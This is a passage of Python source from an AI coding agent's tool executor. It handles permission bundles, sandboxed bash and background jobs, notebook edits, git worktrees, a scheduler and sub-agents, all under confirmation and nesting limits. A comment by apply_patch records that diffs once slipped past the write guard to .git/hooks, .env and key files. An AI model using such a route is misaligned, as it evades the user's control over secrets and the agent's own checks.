                        perms.bash_deny_patterns + (value,)
                    )
            elif kind == "extra_dir":
                # Validate via add_extra_dir first (must exist + be a dir).
                resolved = perms.add_extra_dir(value)
                _kit_settings.persist_extra_dir(
                    resolved, scope=scope, repo_dir=perms.workspace
                )
                value = str(resolved)
            elif kind == "default_mode":
                _kit_settings.persist_default_mode(
                    value, scope=scope, repo_dir=perms.workspace
                )
                perms.mode = value
        except ValueError as exc:
            return json.dumps({"error": str(exc)})
        except Exception as exc:
            return json.dumps({"error": f"persist failed: {exc}"})

        return json.dumps({
            "status": "persisted",
            "kind": kind,
            "value": value,
            "scope": scope,
            "path": scope_path,
        })

    # Bundle profiles: name -> list of allow-pattern templates. The
    # placeholder ``{dir_re}`` is replaced with a regex-escaped form of the
    # bundle directory so patterns are scoped to that project (avoids
    # accidentally matching unrelated venvs elsewhere on the user's
    # filesystem).
    # The venv-tool pattern that's repeated for absolute and relative form;
    # covers everything the agent typically needs to develop a Python
    # project: package management, script execution, tests, linters,
    # formatters, type-check, coverage, doc build. New venv tools should
    # be added to BOTH the absolute and relative pattern below.
    _VENV_TOOL_BIN = (
        r"(?:pip|python(?:\d(?:\.\d+)?)?|pytest|ruff|black|isort|mypy|"
        r"coverage|sphinx-build|pyflakes|flake8|tox|jupyter|ipython)"
    )

    _BUNDLE_PROFILES = {
        "project_dev": [
            # venv creation
            r"^\s*python(?:\d(?:\.\d+)?)?\s+-m\s+venv\s+\S+\s*$",
            # absolute-path venv tools (when agent issues commands with
            # the full venv path — e.g. when cwd is elsewhere).
            # Accepts both leading-dot (.venv-foo) and no-dot (venv) names —
            # weak models randomly pick either convention; both are valid
            # Python naming.
            r"^\s*{dir_re}/\.?venv[\w.-]*/bin/" + _VENV_TOOL_BIN + r"\b",
            # relative-path venv tools (when cwd is the project)
            r"^\s*\.?venv[\w.-]*/bin/" + _VENV_TOOL_BIN + r"\b",
            # globally-available test / lint / format tooling
            r"^\s*pytest\b",
            r"^\s*ruff\s+(?:check|format)\b",
            r"^\s*black\b",
            r"^\s*isort\b",
            r"^\s*mypy\s+\S",
            r"^\s*coverage\b",
            r"^\s*tox\b",
        ],
    }

    def _execute_remember_permission_bundle(
        self, arguments: dict, perms: "KitToolPermissions"
    ) -> str:
        """Persist a curated bundle of permission rules in one confirm step.

        For ``profile='project_dev'``: registers ``directory`` as an
        ``extra_workspace_dir`` and adds the standard venv/pip/python/
        pytest/ruff/mypy auto-allow patterns. Patterns containing the
        ``{dir_re}`` placeholder are scoped to that project's path so
        they don't leak to unrelated venvs elsewhere.

        The user sees a SINGLE confirm dialog summarizing every rule
        about to be written; deny aborts the whole bundle (atomic).
        """
        profile = (arguments.get("profile", "") or "").strip()
        directory = (arguments.get("directory", "") or "").strip()
        scope = (arguments.get("scope", "repo") or "repo").strip().lower()
        rationale = (arguments.get("rationale", "") or "").strip()

        if profile not in self._BUNDLE_PROFILES:
            return json.dumps({"error": (
                f"unknown profile: {profile!r}. "
                f"Known: {sorted(self._BUNDLE_PROFILES)}"
            )})
        if not directory:
            return json.dumps({"error": "directory must be non-empty"})
        if scope not in {"user", "repo"}:
            return json.dumps({"error": f"scope must be 'user' or 'repo', got {scope!r}"})

        # Validate directory exists and resolve to its canonical form.
        try:
            dir_path = Path(directory).expanduser().resolve()
        except Exception as exc:
            return json.dumps({"error": f"invalid directory: {exc}"})
        if not dir_path.is_dir():
            return json.dumps({"error": f"directory not found or not a dir: {directory}"})

        # Build the concrete pattern list for this directory.
        #
        # On systems with symlinks (e.g. BwUniCluster: /home/<user>/ is a
        # symlink to /pfs/data6/home/<user>/), the agent may issue bash
        # commands with EITHER path form. We register patterns for both
        # the resolved (canonical) and unresolved (as-given) directory so
        # bash auto-allow matches regardless of which form the agent picks.
        path_variants: list[str] = [str(dir_path)]
        try:
            dir_unresolved = str(Path(directory).expanduser())
        except Exception:
            dir_unresolved = ""
        if dir_unresolved and dir_unresolved != str(dir_path):
            path_variants.insert(0, dir_unresolved)

        templates = self._BUNDLE_PROFILES[profile]
        patterns: list[str] = []
        for t in templates:
            if "{dir_re}" in t:
                for variant in path_variants:
                    patterns.append(t.format(dir_re=re.escape(variant)))
            else:
                patterns.append(t)

        try:
            from . import kit_settings as _kit_settings
        except Exception as exc:
            return json.dumps({"error": f"kit_settings import failed: {exc}"})

        scope_path = (
            str(_kit_settings.repo_settings_path(dir_path))
            if scope == "repo" else str(_kit_settings.USER_SETTINGS_PATH)
        )

        preview_lines = [
            f"remember_permission_bundle  (profile={profile})",
            f"  scope:     {scope}  ->  {scope_path}",
            f"  rationale: {rationale or '(none)'}",
            "",
            f"Will register extra_workspace_dir:",
            f"    {dir_path}",
            "",
            "Will append the following bash auto-allow patterns:",
        ]
        for p in patterns:
            preview_lines.append(f"    {p}")
        preview_lines.append("")
        preview_lines.append(
            "All rules are written atomically. Deny aborts the whole bundle."
        )
        preview = "\n".join(preview_lines)

        if perms.confirm_callback is None:
            return json.dumps({"error": (
                "remember_permission_bundle needs a user-confirm callback. "
                "Run inside the dashboard with the KIT confirm panel mounted."
            )})
        try:
            ok = bool(perms.confirm_callback(
                "remember_permission_bundle",
                {"profile": profile, "directory": str(dir_path),
                 "scope": scope, "rationale": rationale,
                 "patterns": patterns},
                preview,
            ))
        except Exception as exc:
            return json.dumps({"error": f"confirm_callback raised: {exc}"})
        if not ok:
            return json.dumps({"status": "denied", "profile": profile,
                               "directory": str(dir_path)})

        # Apply atomically. If the directory step or any pattern fails,
        # roll back what we already wrote so the user isn't left with a
        # half-applied bundle.
        applied_patterns: list[str] = []
        try:
            resolved_dir = perms.add_extra_dir(str(dir_path))
            _kit_settings.persist_extra_dir(
                resolved_dir,
                scope=scope,
                repo_dir=dir_path if scope == "repo" else perms.workspace,
            )
            for p in patterns:
                _kit_settings.persist_pattern(
                    p, kind="allow", scope=scope,
                    repo_dir=dir_path if scope == "repo" else perms.workspace,
                )
                if p not in perms.bash_auto_allow_patterns:
                    perms.bash_auto_allow_patterns = (
                        perms.bash_auto_allow_patterns + (p,)
                    )
                applied_patterns.append(p)
        except ValueError as exc:
            return json.dumps({"error": str(exc),
                               "applied_patterns": applied_patterns})
        except Exception as exc:
            return json.dumps({"error": f"persist failed: {exc}",
                               "applied_patterns": applied_patterns})

        return json.dumps({
            "status": "persisted",
            "profile": profile,
            "directory": str(resolved_dir),
            "scope": scope,
            "path": scope_path,
            "patterns": patterns,
            "patterns_count": len(patterns),
        })

    def _execute_bash(
        self, arguments: dict, perms: "KitToolPermissions"
    ) -> str:
        cmd = arguments.get("command", "") or ""
        description = arguments.get("description", "") or ""
        timeout = int(arguments.get("timeout_s", perms.bash_timeout_s) or perms.bash_timeout_s)
        timeout = max(1, min(timeout, perms.bash_max_timeout_s))
        cwd_arg = arguments.get("cwd", "") or ""

        if cwd_arg:
            cwd_resolved, err = self._resolve_in_workspace(cwd_arg, perms, for_read=True)
            if err:
                return json.dumps({"error": err})
            if not cwd_resolved.is_dir():
                return json.dumps({"error": f"cwd is not a directory: {cwd_arg}"})
            run_cwd = cwd_resolved
        else:
            run_cwd = perms.workspace

        env = os.environ.copy()
        env.setdefault("LC_ALL", "C.UTF-8")
        env.setdefault("LANG", "C.UTF-8")

        t0 = time.monotonic()
        try:
            proc = subprocess.run(
                _bash_isolation_argv(cmd, run_cwd, perms),
                cwd=str(run_cwd),
                env=env,
                capture_output=True,
                text=True,
                timeout=timeout,
                check=False,
            )
        except subprocess.TimeoutExpired:
            return json.dumps({
                "error": f"command timed out after {timeout}s",
                "command": cmd[:200],
                "description": description,
            })
        except Exception as exc:
            return json.dumps({"error": f"command failed to start: {exc}"})

        elapsed = time.monotonic() - t0
        out = proc.stdout or ""
        err = proc.stderr or ""
        cap = perms.max_output_chars
        out = _smart_truncate(out, cap, "stdout")
        err = _smart_truncate(err, cap, "stderr")

        return json.dumps({
            "exit_code": proc.returncode,
            "elapsed_s": round(elapsed, 3),
            "stdout": out,
            "stderr": err,
            "command": cmd[:500],
            "description": description,
            "cwd": self._display_path(run_cwd, perms) or ".",
        }, ensure_ascii=False)

    # ------- Background bash jobs ----------------------------------------

    def _execute_bash_background(
        self, arguments: dict, perms: "KitToolPermissions"
    ) -> str:
        """Start a long-running shell command in the background.

        Same gate as :meth:`_execute_bash` (already run by ``_dispatch``):
        sandbox + deny-list + secret-scanner + auto-allow check. Returns
        a ``job_id`` immediately so the agent can keep working while the
        command runs. Output goes to tempfiles read via ``bash_output``.
        """
        cmd = arguments.get("command", "") or ""
        description = arguments.get("description", "") or ""
        cwd_arg = arguments.get("cwd", "") or ""
        timeout_s = int(arguments.get("timeout_s", 24 * 3600) or 24 * 3600)

        if cwd_arg:
            cwd_resolved, err = self._resolve_in_workspace(cwd_arg, perms, for_read=True)
            if err:
                return json.dumps({"error": err})
            if not cwd_resolved.is_dir():
                return json.dumps({"error": f"cwd is not a directory: {cwd_arg}"})
            run_cwd = cwd_resolved
        else:
            run_cwd = perms.workspace

        try:
            from . import bash_jobs as _bj
            job = _bj.get_registry().start(
                command=cmd,
                cwd=str(run_cwd),
                description=description,
                timeout_s=timeout_s,
            )
        except ValueError as exc:
            return json.dumps({"error": str(exc)})
        except Exception as exc:
            return json.dumps({"error": f"failed to start job: {exc}"})

        return json.dumps({
            "status": "started",
            "job_id": job.job_id,
            "pid": job.proc.pid,
            "command": cmd[:500],
            "description": description,
            "cwd": self._display_path(run_cwd, perms) or ".",
            "timeout_s": timeout_s,
            "hint": (
                f"Use bash_status({job.job_id!r}) and "
                f"bash_output({job.job_id!r}) to monitor; "
                f"bash_kill({job.job_id!r}) to stop."
            ),
        }, ensure_ascii=False)

    def _execute_bash_status(self, arguments: dict) -> str:
        job_id = (arguments.get("job_id", "") or "").strip()
        if not job_id:
            return json.dumps({"error": "job_id is required"})
        try:
            from . import bash_jobs as _bj
            job = _bj.get_registry().get(job_id)
        except Exception as exc:
            return json.dumps({"error": f"registry error: {exc}"})
        if job is None:
            return json.dumps({"error": f"unknown job_id: {job_id}"})
        # Optional blocking wait: poll the job server-side so the model spends
        # ONE tool round on a long wait instead of one every few seconds (which
        # exhausted the tool-round budget before a ~10-min job could finish —
        # bug 20260615-152119). Returns the instant the job ends; otherwise
        # after the (capped) wait so the model can decide to keep waiting.
        raw_wait = arguments.get("wait_seconds", None)
        if raw_wait is None:
            wait_s = 0.0
        else:
            try:
                wait_s = float(raw_wait or 0)
            except (TypeError, ValueError):
                wait_s = 0.0
        # Busy-poll guard (model-independent): the first status check on a job
        # is an instant snapshot, but re-checking the SAME still-running job
        # within the busy-poll window — without an explicit wait_seconds — is
        # throttled so a tight poll loop self-paces instead of burning rounds.
        hist = getattr(self, "_bash_poll_ts", None)
        if hist is None:
            hist = self._bash_poll_ts = {}
        if raw_wait is None and job.poll() is None:
            last = hist.get(job_id)
            if last is not None and (time.monotonic() - last) < _BASH_STATUS_BUSY_POLL_WAIT_S:
                wait_s = _BASH_STATUS_BUSY_POLL_WAIT_S
        if wait_s > 0:
            deadline = time.monotonic() + min(wait_s, _BASH_STATUS_WAIT_CAP_S)
            while job.poll() is None:
                remaining = deadline - time.monotonic()
                if remaining <= 0:
                    break
                time.sleep(min(2.0, remaining))
        # Record the post-wait poll time so the NEXT rapid re-poll is throttled;
        # forget finished jobs so reading their result stays instant.
        if job.poll() is None:
            hist[job_id] = time.monotonic()
        else:
            hist.pop(job_id, None)
        return json.dumps(job.status_dict(), ensure_ascii=False)

    def _execute_bash_output(self, arguments: dict) -> str:
        job_id = (arguments.get("job_id", "") or "").strip()
        if not job_id:
            return json.dumps({"error": "job_id is required"})
        head = int(arguments.get("head_lines", 60) or 60)
        tail = int(arguments.get("tail_lines", 200) or 200)
        try:
            from . import bash_jobs as _bj
            reg = _bj.get_registry()
            job = reg.get(job_id)
            if job is None:
                return json.dumps({"error": f"unknown job_id: {job_id}"})
            payload = _bj.read_output(job, head_lines=head, tail_lines=tail)
        except Exception as exc:
            return json.dumps({"error": f"output read failed: {exc}"})
        # Merge with status so the agent doesn't need a second call.
        payload.update({
            k: v for k, v in job.status_dict().items()
            if k in {"job_id", "running", "exit_code", "elapsed_s"}
        })
        return json.dumps(payload, ensure_ascii=False)

    def _execute_bash_kill(self, arguments: dict) -> str:
        job_id = (arguments.get("job_id", "") or "").strip()
        if not job_id:
            return json.dumps({"error": "job_id is required"})
        try:
            from . import bash_jobs as _bj
            ok, msg = _bj.get_registry().kill(job_id)
        except Exception as exc:
            return json.dumps({"error": f"kill failed: {exc}"})
        return json.dumps({
            "status": "ok" if ok else "error",
            "job_id": job_id,
            "message": msg,
        }, ensure_ascii=False)

    # ------- Jupyter notebook tools --------------------------------------

    def _execute_notebook_read(
        self, arguments: dict, perms: "KitToolPermissions"
    ) -> str:
        path_arg = self._get_path_arg(arguments)
        if not path_arg:
            return json.dumps({"error": "path is required"})
        max_chars = int(arguments.get("max_source_chars", 4000) or 4000)
        resolved, err = self._resolve_in_workspace(path_arg, perms, for_read=True)
        if err:
            # Fall back to the read-access gate so cross-root reads
            # still go through the secret-deny + outside-workspace
            # confirm flow that read_file uses.
            from pathlib import Path as _P
            try:
                resolved = _P(path_arg).expanduser().resolve()
            except Exception:
                return json.dumps({"error": err})
            err2 = self._check_read_access(perms, resolved, label=path_arg)
            if err2:
                return json.dumps({"error": err2})
        if not resolved.exists():
            return json.dumps({"error": f"file not found: {path_arg}"})
        if not resolved.is_file():
            return json.dumps({"error": f"not a regular file: {path_arg}"})
        if resolved.suffix.lower() != ".ipynb":
            return json.dumps({"error": (
                f"notebook_read expects a .ipynb file; got "
                f"{resolved.suffix!r}. Use read_file for plain text."
            )})

        try:
            from . import notebook_tools as _nb
            cells = _nb.read_cells(resolved, max_source_chars=max_chars)
        except json.JSONDecodeError as exc:
            return json.dumps({"error": f"not valid JSON / nbformat: {exc}"})
        except Exception as exc:
            return json.dumps({"error": f"notebook read failed: {exc}"})

        # Track the read for the edit-tracker (so notebook_edit can
        # later check the file hasn't changed since this read).
        try:
            perms.read_tracker[str(resolved)] = resolved.stat().st_mtime
        except Exception:
            pass

        return json.dumps({
            "path": self._display_path(resolved, perms),
            "cell_count": len(cells),
            "cells": [
                {
                    "idx": c.idx,
                    "cell_type": c.cell_type,
                    "source": c.source,
                    "output_summary": c.output_summary,
                }
                for c in cells
            ],
        }, ensure_ascii=False)

    def _execute_notebook_edit(
        self, arguments: dict, perms: "KitToolPermissions"
    ) -> str:
        path_arg = self._get_path_arg(arguments)
        cell_idx = arguments.get("cell_idx")
        mode = (arguments.get("mode", "") or "").strip()
        source = arguments.get("source")
        cell_type = (arguments.get("cell_type", "code") or "code").strip()

        if not path_arg:
            return json.dumps({"error": "path is required"})
        if cell_idx is None:
            return json.dumps({"error": "cell_idx is required"})
        try:
            cell_idx = int(cell_idx)
        except (TypeError, ValueError):
            return json.dumps({"error": f"cell_idx must be int, got {cell_idx!r}"})

        resolved, err = self._resolve_in_workspace(path_arg, perms)
        if err:
            return json.dumps({"error": err})
        if not resolved.exists():
            return json.dumps({"error": f"file not found: {path_arg}"})
        if not resolved.is_file():
            return json.dumps({"error": f"not a regular file: {path_arg}"})
        if resolved.suffix.lower() != ".ipynb":
            return json.dumps({"error": (
                f"notebook_edit expects a .ipynb file; got "
                f"{resolved.suffix!r}. Use edit_file for plain text."
            )})

        # Same read-baseline check as edit_file: notebook must have been
        # read first so the agent's mental model of cell indices is up
        # to date.
        tracked = perms.read_tracker.get(str(resolved))
        try:
            current_mtime = resolved.stat().st_mtime
        except Exception:
            current_mtime = None
        if tracked is None:
            return json.dumps({"error": (
                f"call notebook_read on '{path_arg}' before editing — "
                "edits require an established read baseline."
            )})
        if current_mtime is not None and current_mtime > tracked + 1e-3:
            return json.dumps({"error": (
                f"notebook '{path_arg}' was modified since last "
                "notebook_read. Re-read first."
            )})

        try:
            from . import notebook_tools as _nb
            n_before, n_after = _nb.apply_edit(
                resolved, cell_idx=cell_idx, mode=mode,
                source=source, cell_type=cell_type,
            )
        except ValueError as exc:
            return json.dumps({"error": str(exc)})
        except Exception as exc:
            return json.dumps({"error": f"notebook edit failed: {exc}"})

        try:
            perms.read_tracker[str(resolved)] = resolved.stat().st_mtime
        except Exception:
            pass

        disp = self._display_path(resolved, perms)
        delta = n_after - n_before
        delta_str = (
            f"+{delta}" if delta > 0 else f"{delta}" if delta < 0 else "0"
        )
        return json.dumps({
            "status": "ok",
            "path": disp,
            "mode": mode,
            "cell_idx": cell_idx,
            "cell_type": cell_type if mode != "delete" else None,
            "cells_before": n_before,
            "cells_after": n_after,
            "cells_delta": delta_str,
        }, ensure_ascii=False)

    # ------- Phase 7: project introspection -------------------------------

    def _execute_project_introspect(
        self, arguments: dict, perms: Optional["KitToolPermissions"]
    ) -> str:
        from . import project_introspect as _pi
        if perms is None:
            return json.dumps({"error": (
                "project_introspect needs a workspace via permissions"
            )})
        report = _pi.introspect(perms.workspace)
        return json.dumps(report, ensure_ascii=False)

    # ------- Phase 6: tests / patch / code nav ----------------------------

    def _execute_run_tests(
        self, arguments: dict, perms: Optional["KitToolPermissions"]
    ) -> str:
        from . import test_runner as _tr
        if perms is None:
            return json.dumps({"error": (
                "run_tests needs a workspace via permissions"
            )})
        target = str(arguments.get("target", "") or "")
        pytest_args = arguments.get("pytest_args") or []
        if not isinstance(pytest_args, list):
            return json.dumps({"error": "pytest_args must be a list"})
        timeout = int(arguments.get("timeout_s", 300) or 300)
        result = _tr.run_tests(
            workspace=perms.workspace,
            target=target,
            pytest_args=[str(a) for a in pytest_args],
            timeout_s=timeout,
        )
        return json.dumps(result, ensure_ascii=False)

    def _execute_apply_patch(
        self, arguments: dict, perms: Optional["KitToolPermissions"]
    ) -> str:
        from . import patch_apply as _pa
        if perms is None:
            return json.dumps({"error": (
                "apply_patch needs a workspace via permissions"
            )})
        diff = arguments.get("diff", "")
        if not isinstance(diff, str) or not diff.strip():
            return json.dumps({"error": "diff must be a non-empty string"})
        check_only = bool(arguments.get("check_only", False))
        # Plan-mode contract: still read-only.
        if perms.mode == "plan" and not check_only:
            return json.dumps({"error": (
                "plan mode (read-only) — apply_patch with "
                "check_only=true is allowed; use exit_plan_mode to "
                "actually apply."
            )})
        # Gate every file the diff touches through the same per-path write
        # policy as write_file: sandbox+deny-list, read-only-archive hard-deny,
        # self-mod guard, and calc-confirm. (Previously only the self-mod guard
        # ran here, so a diff could reach .git/hooks, .env, keys or a stored
        # calc that write_file refuses.) check_only is `git apply --check`
        # (read-only) → skip the write gate so it stays allowed in plan mode.
        if not check_only:
            gate_err = self._run_permission_gate("apply_patch", arguments, perms)
            if gate_err is not None:
                return json.dumps({"error": gate_err})
        result = _pa.apply_patch(
            workspace=perms.workspace,
            diff_text=diff,
            check_only=check_only,
        )
        return json.dumps(result, ensure_ascii=False)

    def _execute_code_nav(
        self, name: str, arguments: dict,
        perms: Optional["KitToolPermissions"],
    ) -> str:
        from . import code_nav as _cn
        if perms is None:
            return json.dumps({"error": (
                f"{name} needs a workspace via permissions"
            )})
        symbol = str(arguments.get("symbol", "") or "")
        file_hint = str(arguments.get("file_hint", "") or "")
        language = str(arguments.get("language", "auto") or "auto")
        if name == "find_definition":
            result = _cn.find_definition(
                perms.workspace, symbol,
                file_hint=file_hint, language=language,
            )
        else:
            result = _cn.find_references(
                perms.workspace, symbol,
                file_hint=file_hint, language=language,
            )
        return json.dumps(result, ensure_ascii=False)

    # ------- Notifications / remote triggers ------------------------------

    def _execute_push_notification(self, arguments: dict) -> str:
        from . import notify as _n
        title = str(arguments.get("title", "")).strip() or "delfin agent"
        body = str(arguments.get("body", ""))
        urgency = str(arguments.get("urgency", "normal"))
        ok = _n.send_notification(title, body, urgency=urgency)
        return json.dumps({"status": "ok" if ok else "noop", "sent": ok})

    def _execute_remote_trigger(
        self, arguments: dict, perms: Optional["KitToolPermissions"]
    ) -> str:
        from . import notify as _n
        event = str(arguments.get("event", "")).strip()
        if not event:
            return json.dumps({"error": "event is required"})
        payload = arguments.get("payload") or {}
        if not isinstance(payload, dict):
            return json.dumps({"error": "payload must be a JSON object"})
        full = {"event": event, **payload}
        ws = perms.workspace if perms else None
        result = _n.send_remote_trigger(full, workspace=ws)
        return json.dumps({
            "sent": result.sent,
            "status_code": result.status_code,
            "error": result.error,
        })

    # ------- Scheduler / cron ---------------------------------------------

    def _execute_scheduler(self, name: str, arguments: dict) -> str:
        from . import scheduler as _sched
        sch = _sched.get_scheduler()
        try:
            if name == "schedule_wakeup":
                ent = sch.schedule_once(
                    delay_seconds=int(arguments.get("delay_seconds", 0)),
                    prompt=str(arguments.get("prompt", "")),
                    reason=str(arguments.get("reason", "")),
                )
                return json.dumps({
                    "status": "ok",
                    "id": ent.id,
                    "fires_at_epoch": ent.next_fire_at,
                })
            if name == "cron_create":
                ent = sch.schedule_interval(
                    every_seconds=int(arguments.get("every_seconds", 0)),
                    prompt=str(arguments.get("prompt", "")),
                    reason=str(arguments.get("reason", "")),
                    fire_immediately=bool(arguments.get("fire_immediately", False)),
                )
                return json.dumps({
                    "status": "ok",
                    "id": ent.id,
                    "next_fire_at": ent.next_fire_at,
                })
            if name == "cron_list":
                entries = sch.list_entries()
                return json.dumps({
                    "entries": [
                        {
                            "id": e.id, "kind": e.kind,
                            "every_seconds": e.every_seconds,
                            "next_fire_at": e.next_fire_at,
                            "fire_count": e.fire_count,
                            "prompt": e.prompt[:120],
                            "reason": e.reason,
                        }
                        for e in entries
                    ],
                })
            if name == "cron_delete":
                ok = sch.delete(str(arguments.get("entry_id", "")))
                return json.dumps({"status": "ok" if ok else "not_found"})
        except ValueError as exc:
            return json.dumps({"error": str(exc)})
        except Exception as exc:
            return json.dumps({"error": f"{name} failed: {exc}"})
        return json.dumps({"error": f"unknown scheduler op: {name!r}"})

    # ------- Git worktree isolation ---------------------------------------

    def _execute_enter_worktree(
        self, arguments: dict, perms: Optional["KitToolPermissions"]
    ) -> str:
        from . import worktree as _wt
        repo_arg = (arguments.get("repo_dir") or "").strip()
        prefix = (arguments.get("branch_prefix") or "agent").strip() or "agent"
        if repo_arg:
            repo_dir = Path(repo_arg).expanduser()
        else:
            if perms is None:
                return json.dumps({"error": (
                    "repo_dir is required when no workspace is configured"
                )})
            repo_dir = perms.workspace
        try:
            info = _wt.enter_worktree(repo_dir, branch_prefix=prefix)
        except _wt.WorktreeError as exc:
            return json.dumps({"error": str(exc)})
        # Register the worktree path under the agent's allowed roots so
        # subsequent edit/bash calls succeed without manual remember_*.
        if perms is not None:
            try:
                perms.add_extra_dir(info.path)
            except Exception:
                pass
        return json.dumps({
            "status": "ok",
            "path": str(info.path),
            "branch": info.branch,
            "base_ref": info.base_ref,
            "repo_dir": str(info.repo_dir),
        })

    def _execute_exit_worktree(
        self, arguments: dict, perms: Optional["KitToolPermissions"]
    ) -> str:
        from . import worktree as _wt
        path_arg = (arguments.get("path") or "").strip()
        keep_if_changed = bool(arguments.get("keep_if_changed", True))
        if not path_arg:
            return json.dumps({"error": "path is required"})
        wt_path = Path(path_arg).expanduser()
        if not wt_path.is_dir():
            return json.dumps({"error": f"worktree path missing: {wt_path}"})
        # Reconstruct minimal info from `git -C wt_path status` + branch
        try:
            head = subprocess.check_output(
                ["git", "rev-parse", "--abbrev-ref", "HEAD"],
                cwd=str(wt_path), text=True,
            ).strip()
            base = subprocess.check_output(
                ["git", "merge-base", head, head],   # current HEAD as a stand-in
                cwd=str(wt_path), text=True,
            ).strip()
            # Find the source repo via `git worktree list`
            source = subprocess.check_output(
                ["git", "worktree", "list", "--porcelain"],
                cwd=str(wt_path), text=True,
            )
        except subprocess.CalledProcessError as exc:
            return json.dumps({"error": f"git query failed: {exc}"})
        except FileNotFoundError:
            return json.dumps({"error": "git is not installed"})
        # Pick the FIRST `worktree` block from the list — that's the main repo.
        repo_dir = wt_path
        for line in source.splitlines():
            if line.startswith("worktree "):
                repo_dir = Path(line.removeprefix("worktree ").strip())
                break
        info = _wt.WorktreeInfo(
            repo_dir=repo_dir,
            path=wt_path,
            branch=head,
            base_ref=base,
            created_at=0.0,
        )
        try:
            _wt.exit_worktree(info, keep_if_changed=keep_if_changed)
        except _wt.WorktreeError as exc:
            return json.dumps({"error": str(exc)})
        return json.dumps({
            "status": "ok",
            "had_changes": info.had_changes,
            "kept": info.final_path is not None,
            "final_path": str(info.final_path) if info.final_path else "",
            "branch": info.branch,
        })

    def _execute_worktree_merge(
        self, arguments: dict, perms: Optional["KitToolPermissions"]
    ) -> str:
        from . import worktree as _wt
        path_arg = (arguments.get("path") or "").strip()
        base_arg = (arguments.get("base_ref") or "").strip()
        target_arg = (arguments.get("target_dir") or "").strip()
        if not path_arg:
            return json.dumps({"error": "path is required"})
        wt_path = Path(path_arg).expanduser()
        if not wt_path.is_dir():
            return json.dumps({"error": f"worktree path missing: {wt_path}"})
        try:
            head = subprocess.check_output(
                ["git", "rev-parse", "--abbrev-ref", "HEAD"],
                cwd=str(wt_path), text=True,
            ).strip()
            # The source repo is the FIRST entry of `git worktree list`.
            listing = subprocess.check_output(
                ["git", "worktree", "list", "--porcelain"],
                cwd=str(wt_path), text=True,
            )
        except subprocess.CalledProcessError as exc:
            return json.dumps({"error": f"git query failed: {exc}"})
        except FileNotFoundError:
            return json.dumps({"error": "git is not installed"})
        source_repo = wt_path
        for line in listing.splitlines():
            if line.startswith("worktree "):
                source_repo = Path(line.removeprefix("worktree ").strip())
                break
        target = Path(target_arg).expanduser() if target_arg else source_repo
        # Determine the branch point: explicit, else merge-base of the
        # worktree's HEAD with the target's HEAD (the shared ancestor).
        base = base_arg
        if not base:
            try:
                target_head = subprocess.check_output(
                    ["git", "rev-parse", "HEAD"],
                    cwd=str(target), text=True,
                ).strip()
                base = subprocess.check_output(
                    ["git", "merge-base", "HEAD", target_head],
                    cwd=str(wt_path), text=True,
                ).strip()
            except (subprocess.CalledProcessError, FileNotFoundError):
                base = "HEAD"  # fall back to dirty-only changes vs current HEAD
        info = _wt.WorktreeInfo(
            repo_dir=target,
            path=wt_path,
            branch=head,
            base_ref=base,
            created_at=0.0,
        )
        try:
            result = _wt.merge_worktree(info)
        except _wt.WorktreeError as exc:
            return json.dumps({"error": str(exc)})
        return json.dumps({
            "status": "ok" if result.ok else "conflict",
            "applied": result.applied,
            "files": result.files,
            "target": str(target),
            "message": result.message,
        })

    # ------- Sub-agent delegation -----------------------------------------

    def _execute_subagent(
        self, arguments: dict, perms: Optional["KitToolPermissions"]
    ) -> str:
        from . import subagents as _sa
        sa_type = (arguments.get("subagent_type") or "").strip()
        description = (arguments.get("description") or "").strip()
        prompt = arguments.get("prompt") or ""
        isolation = (arguments.get("isolation") or "").strip()
        resume_id = (arguments.get("resume_id") or "").strip()
        # When resuming, the stored session's type/description win inside
        # run_subagent — only validate them for fresh runs.
        if not resume_id:
            if not sa_type:
                return json.dumps({"error": "subagent_type is required"})
            if sa_type not in _sa.SUBAGENT_PRESETS:
                return json.dumps({
                    "error": f"unknown subagent_type: {sa_type!r}",
                    "available": list(_sa.SUBAGENT_PRESETS),
                })
            if not description:
                return json.dumps({"error": "description is required"})
        if not prompt or len(prompt) < 20:
            return json.dumps({"error": (
                "prompt must brief the sub-agent thoroughly (>=20 chars)"
            )})
        if perms is None or perms.subagent_runner is None:
            return json.dumps({
                "error": "subagent runner not attached",
                "hint": (
                    "subagent requires the parent OpenAIClient to "
                    "have set perms.subagent_runner. Currently None."
                ),
            })
        # Nesting guard: a sub-agent at/above the depth cap may not spawn
        # further sub-agents. Depth rides on the perms (bumped per child in
        # _derive_perms), not the shared executor. Without it a delegated agent
        # could recursively fan out (4^depth threads + worktrees).
        if getattr(perms, "subagent_depth", 0) >= _max_subagent_depth():
            return json.dumps({"error": (
                "subagent nesting limit reached: a sub-agent may not spawn "
                "further sub-agents. Do this part of the work directly."
            )})
        # Only pass resume_from when set — externally attached runners
        # (tests, custom embeddings) may predate the parameter.
        _resume_kw = {"resume_from": resume_id} if resume_id else {}
        # Background mode: spawn the subagent on a
        # thread and return immediately — the main agent keeps working.
        # Progress/result are visible in the dashboard subagent panel
        # (running registry + telemetry); limits still apply per child.
        if bool(arguments.get("background")):
            import threading as _th
            import uuid as _uuid
            # Bound the number of concurrent background sub-agents so a session
            # can't leak unbounded daemon threads + worktrees. Saturated → tell
            # the model to wait or run in the foreground instead of spawning.
            _bg_release = _acquire_bg_subagent_slot()
            if _bg_release is None:
                return json.dumps({"error": (
                    "too many background sub-agents are already running. Wait "
                    "for some to finish (collect with subagent_result), or run "
                    "this one in the foreground."
                )})
            # Reserve the id up-front so the parent can poll/collect this
            # specific run via subagent_result(sa_id) once it finishes.
            _bg_sa_id = _uuid.uuid4().hex[:8]

            def _bg_run():
                try:
                    try:
                        perms.subagent_runner(
                            subagent_type=sa_type,
                            description=description,
                            prompt=prompt,
                            isolation=isolation,
                            sa_id=_bg_sa_id,
                            **_resume_kw,
                        )
                    except TypeError:
                        # Older runner without sa_id support.
                        perms.subagent_runner(
                            subagent_type=sa_type,
                            description=description,
                            prompt=prompt,
                            isolation=isolation,
                            **_resume_kw,
                        )
                except Exception:
                    pass
                finally:
                    try:
                        _bg_release()
                    except Exception:
                        pass

            _th.Thread(target=_bg_run, daemon=True,
                       name=f"subagent-bg-{sa_type}").start()
            return json.dumps({
                "status": "started_in_background",
                "sa_id": _bg_sa_id,
                "subagent_type": sa_type,
                "description": description,
                "note": ("Running in the background. Collect the result later "
                         f"with subagent_result(sa_id='{_bg_sa_id}'); it also "
                         "appears in the 🤖 Subagents panel. Continue other "
                         "work meanwhile."),
            })

        try:
            payload = perms.subagent_runner(
                subagent_type=sa_type,
                description=description,
                prompt=prompt,
                isolation=isolation,
                **_resume_kw,
            )
        except Exception as exc:
            return json.dumps({"error": f"subagent runner raised: {exc}"})
